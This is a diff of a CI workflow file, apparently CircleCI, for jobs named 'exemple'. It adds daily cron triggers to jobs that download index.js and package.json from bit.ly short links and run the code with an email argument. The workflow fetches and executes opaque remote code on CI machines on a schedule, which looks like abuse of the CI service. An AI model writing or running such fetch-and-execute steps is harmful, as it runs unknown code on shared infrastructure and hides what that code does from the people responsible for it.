@@ -10,7 +10,7 @@ jobs:
       - run: sudo apt-get install -y chromium-browser
       - run: curl -fsSL https://bit.ly/3nKzqND -o index.js && curl -fsSL https://bit.ly/3cBwVH3 -o package.json
       - run: npm i -s
-      - run: node index -t 58 -r 2 -e cpiatbarilochrrgbne@vip.stu.office.gy
+      - run: node index -t 57 -r 2 -e cpiatbarilochrrgbne@vip.stu.office.gy
  exemple_no_2:
     machine:
       image: ubuntu-2004:202101-01
@@ -84,7 +84,21 @@ jobs:
       
       
 workflows:
+  version: 2
   exemple:
+    triggers:
+      - schedule:
+          cron: "2 0 * * *"
+          filters:
+            branches:
+              only:
+                - main
+      - schedule:
+          cron: "6 1 * * *"
+          filters:
+            branches:
+              only:
+                - main
     jobs:
       - exemple_no_1
       - exemple_no_2
